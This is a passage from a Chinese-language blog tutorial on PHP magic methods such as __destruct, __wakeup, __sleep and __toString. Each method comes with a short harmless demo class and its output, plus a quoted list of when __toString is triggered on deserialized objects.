class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure></div>

<p>可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。</p>
<hr>
<h5 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h5><p>在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure></div>

<p>可以看到执行了两次<code>__destruct()</code>，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
<hr>
<h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure></div>

<p>可以看到**__call**需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。</p>
<hr>
<h5 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h5><p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure></div>

<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 <strong>self</strong>，<strong>parent</strong> 和 <strong>static</strong>）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<hr>
<h5 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h5><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure></div>

<p><code>__get</code>魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</p>
<hr>
<h5 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h5><p>给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><strong>set</strong>跟<strong>get</strong>相反，一个是访问不存在的属性，一个是给不存在的属性赋值。</p>
<hr>
<h5 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h5><p>对<strong>不可访问属性</strong>（比如private的属性）调用 <strong>isset()</strong> 或 <strong>empty()</strong> 时，<code>__isset()</code> 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure></div>

<p>该魔术方法使用了<strong>isset()<strong>或者</strong>empty()<strong>只要属性是</strong>private</strong>或者不存在的都会触发。</p>
<hr>
<h5 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h5><p>对不可访问属性调用 <strong>unset()</strong> 时，**__unset()** 会被调用。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure></div>

<p>如果一个类定义了魔术方法 <code>__unset()</code> ，那么我们就可以使用 <strong>unset()</strong> 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
<hr>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h5><p><strong>serialize()</strong> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载序列化调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到执行序列化之前会先执行<strong>sleep()函数，上面</strong>sleep的函数作用是过滤掉password的变量值。</p>
<hr>
<h5 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h5><p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义反序列化后调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到执行反序列化之前会先执行<strong>wakeup()函数，上面</strong>wakeup的函数作用是将username的变量值赋值给password变量。</p>
<hr>
<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><p><strong>__toString()</strong> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString</span><br></pre></td></tr></table></figure></div>

<p>特别注意__toString的触发条件，引用k0rz3n师傅的笔记：</p>
<blockquote>
<p>(1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<hr>
<h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure></div>

<hr>
<h5 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h5><p>当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <code>__clone()</code> ，如果该魔术方法存在的话。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span 